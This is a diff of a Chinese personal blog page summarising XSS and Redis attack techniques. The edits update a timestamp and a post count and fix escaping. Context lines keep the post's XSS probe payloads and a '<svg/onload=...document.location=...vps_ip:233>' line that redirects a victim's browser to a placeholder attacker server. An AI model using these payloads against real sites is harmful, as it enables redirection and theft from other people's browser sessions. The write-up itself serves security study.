@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/08/16/xss和Redis总结/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="总结一些知识点">
-<meta property="og:updated_time" content="2018-08-17T06:24:08.380Z">
+<meta property="og:updated_time" content="2018-08-18T08:13:57.063Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss和Redis总结">
 <meta name="twitter:description" content="总结一些知识点">
@@ -337,7 +337,7 @@
 <p>继续尝试别的</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;img src=x onerror= /&gt;</div><div class="line"></div><div class="line">&lt;svg onload&gt;</div><div class="line"></div><div class="line">&lt;svg/onload&gt;</div></pre></td></tr></table></figure>
 <p>还有好多参考<br><a href="http://www.freebuf.com/articles/web/20282.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20282.html</a></p>
-<p>假设<svg onload="">可以 那么继续</svg></p>
+<p>假设<code>&lt;svg/onload&gt;</code>可以 那么继续</p>
 <p><code>&lt;svg/onload=&quot;document.location=&#39;http://vps_ip:233&#39;&quot;&gt;</code></p>
 <p>测试vps上能不能收到回显</p>
 <p>可以的话开始</p>
@@ -484,7 +484,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">65</span>
+                <span class="site-state-item-count">66</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
